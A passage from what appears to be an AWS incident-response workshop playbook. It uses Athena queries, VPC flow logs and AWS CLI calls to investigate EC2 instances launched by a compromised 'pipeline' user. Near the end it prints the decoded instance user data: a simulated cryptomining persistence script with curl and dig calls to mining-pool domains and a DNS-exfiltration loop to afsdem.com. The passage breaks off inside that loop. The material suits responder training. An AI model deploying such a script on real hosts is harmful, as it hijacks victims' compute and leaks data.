in-use","macAddress":"0e:dc:85:6a:14:0b","privateIpAddress":"172.31.44.182","privateDnsName":"ip-172-31-44-182.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-0c3e6a238baa4eece","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522786000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"172.31.44.182","privateDnsName":"ip-172-31-44-182.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}  |             |
2021-07-29T01:39:48Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-0814a44a9872cd3b0","disableApiTermination":false,"disableApiStop":false,"clientToken":"df5851a5-5ad4-4ff3-9cc1-c4222be77fdc"}  |  {"requestId":"443dac68-25ca-4d3a-9f89-6b2df533344d","reservationId":"r-096b19a389870de26","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-0d6c5bcfe5a9fd3f1","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-172-31-2-122.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522788000,"placement":{"availabilityZone":"us-east-1a","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-0814a44a9872cd3b0","vpcId":"vpc-045be8f0854ed7f0b","privateIpAddress":"172.31.2.122","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"df5851a5-5ad4-4ff3-9cc1-c4222be77fdc","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-02c06d62c304a4811","subnetId":"subnet-0814a44a9872cd3b0","vpcId":"vpc-045be8f0854ed7f0b","ownerId":"999999999999","status":"in-use","macAddress":"02:08:6a:c1:62:29","privateIpAddress":"172.31.2.122","privateDnsName":"ip-172-31-2-122.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-01bbd6d87fa365de4","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522788000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"172.31.2.122","privateDnsName":"ip-172-31-2-122.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}        |             |
2021-07-29T01:39:51Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-079b9a134b8800b36","disableApiTermination":false,"disableApiStop":false,"clientToken":"6a40fb0a-74e4-40e0-81e3-1cf9c7851bd1"}  |  {"requestId":"8d145141-5c29-4bb1-809b-ec4e12ea703d","reservationId":"r-0666b6a1618a7753c","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-01b03328133d38ff1","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-172-31-74-100.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522791000,"placement":{"availabilityZone":"us-east-1f","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-079b9a134b8800b36","vpcId":"vpc-045be8f0854ed7f0b","privateIpAddress":"172.31.74.100","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"6a40fb0a-74e4-40e0-81e3-1cf9c7851bd1","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-0946e744a475b9d2a","subnetId":"subnet-079b9a134b8800b36","vpcId":"vpc-045be8f0854ed7f0b","ownerId":"999999999999","status":"in-use","macAddress":"16:d3:ca:35:6f:8f","privateIpAddress":"172.31.74.100","privateDnsName":"ip-172-31-74-100.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-06f7e58c4c3dc95e5","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522791000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"172.31.74.100","privateDnsName":"ip-172-31-74-100.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}  |             |
2021-07-29T01:39:54Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-013375d41732c06b4","disableApiTermination":false,"disableApiStop":false,"clientToken":"71bc94c4-cf67-4e33-a681-10db55dd6800"}  |  {"requestId":"61513ace-375d-4434-8f2f-8012df079f2c","reservationId":"r-09a0710d2c899ac06","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-04a8f1d8f0e9a1c9c","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-172-31-51-88.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522793000,"placement":{"availabilityZone":"us-east-1e","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-013375d41732c06b4","vpcId":"vpc-045be8f0854ed7f0b","privateIpAddress":"172.31.51.88","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"71bc94c4-cf67-4e33-a681-10db55dd6800","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-080c4834252541a5a","subnetId":"subnet-013375d41732c06b4","vpcId":"vpc-045be8f0854ed7f0b","ownerId":"999999999999","status":"in-use","macAddress":"06:b6:fc:23:f3:f5","privateIpAddress":"172.31.51.88","privateDnsName":"ip-172-31-51-88.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-03e4145904d623475","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522793000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"172.31.51.88","privateDnsName":"ip-172-31-51-88.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}        |             |

```
-- retrieve additional information about changes made to the services
SELECT DISTINCT useridentity.accesskeyid
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
      AND date_partition >= '2021/07/22'
      AND date_partition <= '2021/07/29'
```

accesskeyid  |
-----------|
AKIAIOSFODNN7EXAMPLE  |


```
-- EC2 instance ids deployed by actor
SELECT json_extract_scalar(responseelements, '$.instancesSet.items[0].instanceId') AS instance_id
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
      AND date_partition >= '2021/07/22'
      AND date_partition <= '2021/07/29'
      AND eventname IN ('RunInstances');  
```

instance_id  |
------------------  |
i-021345abcdef678a |
i-021345abcdef678b |
i-021345abcdef678c |
i-021345abcdef678d |
i-021345abcdef678e |
i-021345abcdef678f |
i-021345abcdef678g |
i-021345abcdef678h |
i-021345abcdef678i |
i-021345abcdef678j |

```
-- retrieve past 7 days of infrastructure and application network activity         
SELECT "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress, 
       "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress,
       count(*) as count
FROM "irworkshopgluedatabase"."irworkshopgluetablevpcflow" 
INNER JOIN "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
ON ("irworkshopgluedatabase"."irworkshopgluetablecloudtrail".sourceipaddress = 
   "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress)
   OR
   ("irworkshopgluedatabase"."irworkshopgluetablecloudtrail".sourceipaddress = 
   "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress)
WHERE "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition >= '2021/07/12'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition <= '2021/07/29'
GROUP BY "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress, 
         "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress
ORDER BY count DESC
```

```
Zero records returned.
```

```
-- retrieve past 7 days of infrastructure and application network activity         
SELECT "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress, 
       "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress,
       "irworkshopgluedatabase"."irworkshopgluetablevpcflow".instanceid,
       count(*) as count
FROM "irworkshopgluedatabase"."irworkshopgluetablevpcflow" 
INNER JOIN "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
ON (json_extract_scalar(responseelements, '$.instancesSet.items[0].instanceId') = 
   "irworkshopgluedatabase"."irworkshopgluetablevpcflow".instanceid)
WHERE "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition >= '2021/07/22'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition <= '2021/07/29'
GROUP BY "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress, 
         "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress,
         "irworkshopgluedatabase"."irworkshopgluetablevpcflow".instanceid
ORDER BY count DESC;
```

sourceaddress    |  destinationaddress  |  instanceid           |  count
-----------------|----------------------|-----------------------|-------
198.51.100.10    |  192.168.0.251       |  i-021345abcdef678a  |  545
198.51.100.10    |  192.168.0.251       |  i-021345abcdef678f  |  322
192.168.1.234    |  198.51.100.10       |  i-021345abcdef678i  |  196
198.51.100.10    |  192.168.1.234       |  i-021345abcdef678h  |  193
192.168.0.251    |  198.51.100.10       |  i-021345abcdef678d  |  123
198.51.100.10    |  192.168.0.251       |  i-021345abcdef678c  |  123
198.51.100.10    |  192.168.1.234       |  i-021345abcdef678a  |  113
192.168.1.234    |  198.51.100.10       |  i-021345abcdef678f  |  99
192.168.0.251    |  198.51.100.10       |  i-021345abcdef678e  |  99
198.51.100.10    |  192.168.1.234       |  i-021345abcdef678e  |  95
198.51.100.10    |  198.51.100.10       |  i-021345abcdef678a  |  88
...              |  ...                 |  ...                 |  ...

* the query output is significant large. the goal is to parse through all network sessions and find anomalies. user your network forensics techniques which are out of scope for this playbook.

```
-- Enumerate EC2 instance IP addresses
SELECT json_extract_scalar(responseelements, '$.instancesSet.items[0].privateIpAddress') AS instance_private_ip
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
      AND date_partition >= '2021/07/22'
      AND date_partition <= '2021/07/29'
      AND eventname IN ('RunInstances');    
```

instance_private_ip |
------------------- |
192.168.2.146 |
192.168.1.234 |
192.168.3.174 |
192.168.0.251 |
172.31.29.22 |
172.31.81.101 |
172.31.44.182 |
172.31.2.122 |
172.31.74.100 |
172.31.51.88 |

```
-- retrieve past 7 days of the involved instances egress traffic  
SELECT "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress, 
       "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress,
       "irworkshopgluedatabase"."irworkshopgluetablevpcflow".instanceid,
       count(*) as count
FROM "irworkshopgluedatabase"."irworkshopgluetablevpcflow" 
INNER JOIN "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
ON (json_extract_scalar(responseelements, '$.instancesSet.items[0].privateIpAddress') = 
   "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress)
WHERE "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition >= '2021/07/22'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition <= '2021/07/29'
GROUP BY "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress, 
         "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress,
         "irworkshopgluedatabase"."irworkshopgluetablevpcflow".instanceid
ORDER BY count DESC
```

sourceaddress  |  destinationaddress  |  instanceid          |  count
---------------|----------------------|----------------------|-------
192.168.1.234  |  198.51.100.10       |  i-021345abcdef678a  |  198
192.168.0.251  |  198.51.100.11       |  i-021345abcdef678b  |  126
192.168.0.251  |  198.51.100.12       |  i-021345abcdef678c  |  100
192.168.1.234  |  198.51.100.13       |  i-021345abcdef678d  |  100
192.168.0.251  |  198.51.100.14       |  i-021345abcdef678e  |  88
192.168.0.251  |  198.51.100.15       |  i-021345abcdef678f  |  80
192.168.3.174  |  198.51.100.16       |  i-021345abcdef678h  |  79
192.168.2.146  |  198.51.100.17       |  i-021345abcdef678i  |  79
192.168.2.146  |  198.51.100.18       |  i-021345abcdef678j  |  78

```
-- previous query modified to list only IP addresses
SELECT "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress
FROM "irworkshopgluedatabase"."irworkshopgluetablevpcflow" 
INNER JOIN "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
ON (json_extract_scalar(responseelements, '$.instancesSet.items[0].privateIpAddress') = 
   "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress)
WHERE "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition >= '2021/07/22'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition <= '2021/07/29'
GROUP BY "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress;
```

destinationaddress |
------------------ |
198.51.100.11 |
198.51.100.11 |
198.51.100.11 |
198.51.100.11 |
198.51.100.11 |
198.51.100.11 |
198.51.100.11 |
198.51.100.11 |


```
-- check API call activity from IP addresses the EC2 instances contacted         
SELECT "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress
FROM "irworkshopgluedatabase"."irworkshopgluetablevpcflow" 
INNER JOIN "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
ON (json_extract_scalar(responseelements, '$.instancesSet.items[0].privateIpAddress') = 
   "irworkshopgluedatabase"."irworkshopgluetablevpcflow".sourceaddress) AND
   (json_extract_scalar(responseelements, '$.instancesSet.items[0].privateIpAddress') = 
   "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".sourceipaddress)
WHERE "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition >= '2021/07/22'
       AND "irworkshopgluedatabase"."irworkshopgluetablecloudtrail".date_partition <= '2021/07/29'
GROUP BY "irworkshopgluedatabase"."irworkshopgluetablevpcflow".destinationaddress;
```

```
Zero records returned.
```

#### AWS CLI calls

* Profiling EC2 instances:
    * i-021345abcdef678a
    * i-021345abcdef678b
    * i-021345abcdef678c
    * i-021345abcdef678d
    * i-021345abcdef678e
    * i-021345abcdef678f
    * i-021345abcdef678g
    * i-021345abcdef678h
    * i-021345abcdef678i
    * i-021345abcdef678j

```
# Check security groups attached to instances
sgs=$(aws ec2 describe-instances --instance-ids i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j --region us-east-1 --profile security_break_glass | jq -r '.Reservations[].Instances[].NetworkInterfaces[].Groups[].GroupId')
for sg in "${sgs[@]}"; do aws ec2 describe-security-groups --group-ids ${sg} --region us-east-1 | jq -r '.SecurityGroups[].IpPermissions'; done

```

* Security groups have no attributes

```
[
  {
    "IpProtocol": "-1",
    "IpRanges": [],
    "Ipv6Ranges": [],
    "PrefixListIds": [],
    "UserIdGroupPairs": [
      {
        "GroupId": "sg-0030477c71f7a0206",
        "UserId": "999999999999"
      }
    ]
  }
]
[
  {
    "IpProtocol": "-1",
    "IpRanges": [],
    "Ipv6Ranges": [],
    "PrefixListIds": [],
    "UserIdGroupPairs": [
      {
        "GroupId": "sg-050c333b86822c1f1",
        "UserId": "999999999999"
      }
    ]
  }
]
```


```
# check EC2 instance's instance profile
aws ec2 describe-instances --instance-ids i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j --region us-east-1 --profile security_break_glass | jq -r '.Reservations[].Instances[].IamInstanceProfile'
     
```

* No instance profiles

```
null
null
null
null
null
null
null
null
null
null
```

```
# EC2 instance types and quantity
aws ec2 describe-instances --instance-ids i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j --region us-east-1 --profile security_break_glass | jq -r '.Reservations[].Instances[].InstanceType' | sort -n | uniq -c
```

* EC2 instance type is ```t2.nano```

```
10 t2.nano
```

```
# EC2 instance AMI
aws ec2 describe-instances --instance-ids i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j --region us-east-1 --profile security_break_glass | jq -r '.Reservations[].Instances[].ImageId' | sort -n | uniq -c
```

* ami-0c2b8ca1dad447f8a

```
10 ami-0c2b8ca1dad447f8a
```

```
# Describe AMI
aws ec2 describe-images --image-id ami-0c2b8ca1dad447f8a --region us-east-1 --profile security_break_glass

```

* Image owned by Amazon

```
{
    "Images": [
        {
            "Architecture": "x86_64",
            "CreationDate": "2021-07-27T06:11:27.000Z",
            "ImageId": "ami-0c2b8ca1dad447f8a",
            "ImageLocation": "amazon/amzn2-ami-hvm-2.0.20210721.2-x86_64-gp2",
            "ImageType": "machine",
            "Public": true,
            "OwnerId": "137112412989",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "State": "available",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": true,
                        "SnapshotId": "snap-1234567890abcdef0",
                        "VolumeSize": 8,
                        "VolumeType": "gp2",
                        "Encrypted": false
                    }
                }
            ],
            "Description": "Amazon Linux 2 AMI 2.0.20210721.2 x86_64 HVM gp2",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "ImageOwnerAlias": "amazon",
            "Name": "amzn2-ami-hvm-2.0.20210721.2-x86_64-gp2",
            "RootDeviceName": "/dev/xvda",
            "RootDeviceType": "ebs",
            "SriovNetSupport": "simple",
            "VirtualizationType": "hvm"
        }
    ]
}

```


```
# Extract User Data from each EC2 instance
instances="i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j"
for instance in ${instances}; do aws ec2 describe-instance-attribute --attribute userData --instance-id ${instance} --region us-east-1 --profile security_break_glass | jq -r '.userData.Value' > ${instance}"_UserData.b64"; done 
```

* The User Data for all instances is identical
```
cat i-021345abcdef678b_UserData.b64 | base64 --decode

Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
mkdir -p /usr/cryptokit
touch /usr/cryptokit/persist.sh
chmod 750 /usr/cryptokit/persist.sh
echo "#!/bin/bash" >> /usr/cryptokit/persist.sh
echo "dig donate.v2.xmrig.com" >> /usr/cryptokit/persist.sh
echo "dig systemten.org" >> /usr/cryptokit/persist.sh
echo "dig xmr.pool.minergate.comac" >> /usr/cryptokit/persist.sh
echo "dig pool.minergate.com" >> /usr/cryptokit/persist.sh
echo "dig dockerupdate.anondns.net" >> /usr/cryptokit/persist.sh
echo "dig rspca-northamptonshire.org.uk" >> /usr/cryptokit/persist.sh
echo "dig xmrpool.eu" >> /usr/cryptokit/persist.sh
echo "dig cryptofollow.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-usa.dwarfpool.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-eu.dwarfpool.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-eu1.nanopool.org" >> /usr/cryptokit/persist.sh
echo "curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &" >> /usr/cryptokit/persist.sh
echo "curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &" >> /usr/cryptokit/persist.sh
echo "for i in {1..10};" >> /usr/cryptokit/persist.sh
echo "do" >> /usr/cryptokit/persist.sh
echo "  dig CgpMb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldC.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig wgY29uc2VjdGV0dXIgYWRpcGlzY2luZyBlbGl0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig LiBWZXN0aWJ1bHVtIGFjIHJpc3VzIGRvbG9yLi.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig BJbiBldSBpbXBlcmRpZXQgbWksIGlkIHNjZWxl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cmlzcXVlIG9yY2kuIE51bGxhbSB1dCBsaWJlcm.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 8gcHVydXMuIFBlbGxlbnRlc3F1ZSBhdCBmcmlu.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Z2lsbGEgbWV0dXMsIGFjIHVsdHJpY2VzIGVyYX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig QuIEZ1c2NlIGN1cnN1cyBtb2xsaXMgcmlzdXMg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dXQgdWx0cmljaWVzLiBOYW0gbWFzc2EganVzdG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 8sIHVsdHJpY2llcyBhdWN0b3IgbWkgdXQsIGRp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Y3R1bSBsb2JvcnRpcyBudWxsYS4gTnVsbGEgc2.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig l0IGFtZXQgZmVsaXMgbm9uIGlwc3VtIHZlc3Rp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YnVsdW0gcmhvbmN1cy4gTG9yZW0gaXBzdW0gZG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFk.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXBpc2NpbmcgZWxpdC4gSW4gZmF1Y2lidXMgaW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig QgZWxpdCBhdCBtYXhpbXVzLiBBbGlxdWFtIGRh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cGlidXMgdXQgbWF1cmlzIG5lYyBmYXVjaWJ1cy.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 4gUHJvaW4gYXVjdG9yIGxpYmVybyBuZWMgYXVn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dWUgc2FnaXR0aXMgY29uZGltZW50dW0uIFZlc3.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig RpYnVsdW0gYmliZW5kdW0gb2RpbyBxdWFtLCBh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dCBjb25ndWUgbnVsbGEgdml2ZXJyYSBpbi4gSW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 4gdWx0cmljaWVzIHR1cnBpcyBhdCBmYWNpbGlz.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXMgZGljdHVtLiBFdGlhbSBuaXNpIGFudGUsIG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig RpY3R1bSBldCBoZW5kcmVyaXQgbmVjLCBzb2Rh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bGVzIGlkIGVyb3MuCgpQaGFzZWxsdXMgZmV1Z2.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig lhdCBudW5jIHNlZCBzdXNjaXBpdCBmYXVjaWJ1.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cy4gQWVuZWFuIHRpbmNpZHVudCBwb3J0dGl0b3.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IgbmlzbCwgdXQgY3Vyc3VzIGZlbGlzIHZvbHV0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cGF0IHZpdGFlLiBNb3JiaSBuZWMgbGVvIHB1bH.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig ZpbmFyLCBhY2N1bXNhbiBtYXVyaXMgbmVjLCBj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig b21tb2RvIG1hdXJpcy4gTmFtIGNvbW1vZG8gZW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dldCBlbmltIGF0IGFsaXF1YW0uIFN1c3BlbmRp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig c3NlIGVnZXN0YXMgbWFzc2EgaWQgcmlzdXMgcG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGVudGVzcXVlIHBvcnR0aXRvciBuZWMgbmVj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IG5lcXVlLiBDcmFzIG5lYyBzZW0gYXJjdS4gTn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGEgcXVpcyBzYXBpZW4gaW4gbGFjdXMgbGFj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aW5pYSB1bHRyaWNlcyBtYXR0aXMgZXQgcHVydX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MuIE51bmMgZmVybWVudHVtIG5lcXVlIGlkIG51.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bmMgYmxhbmRpdCBtYXhpbXVzLiBEdWlzIGV1IH.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig NvbGxpY2l0dWRpbiBudWxsYSwgYWMgbWF0dGlz.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGF1Z3VlLiBNYXVyaXMgcXVpcyBjdXJzdXMgaX.afsdem.com;" >> /usr/cryptokit/persist.sh
